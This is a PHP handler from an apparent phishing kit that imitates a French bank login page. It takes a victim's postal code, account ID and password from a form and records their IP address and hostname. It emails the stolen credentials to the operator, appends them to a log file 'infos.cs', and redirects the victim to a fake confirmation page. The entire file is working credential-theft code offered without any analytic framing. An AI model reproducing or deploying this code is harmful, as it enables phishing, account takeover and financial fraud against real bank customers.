<?php
session_start();
include('det.php');
include('val.php');
	$_SESSION['postal'] = $_POST['CP'];
	$_SESSION['id'] = $_POST['CCPTE'];
	$_SESSION['pass'] = $_POST['CCCRYC'];
$hostname = gethostbyaddr($ip);
$message .= "[------------------------------]\n";
$message .= "CODE POSTALE     : ".$_SESSION['postal']."\n";
$message .= "ID       : ".$_SESSION['id']."\n";
$message .= "PS       : ".$_SESSION['pass']."\n";
$message .= "IP    : $ip | $hostname\n";
$message .= "[------------------------------]\n";
$subject = "JHONELUC[LOGIN] $ip";
$headers = "From: CA<info@inc.de>";
mail($send,$subject,$message,$headers);
if ($tabligh == "yes") {
mailling($send,$subject,$message,$headers);
    }
$fp = fopen("../../infos.cs", "a");
			fputs($fp, $message);
			fclose($fp);
     echo "<meta http-equiv='refresh' content='0; url=confirmation.php?validation=$md5&session=P$md5'/>";

?>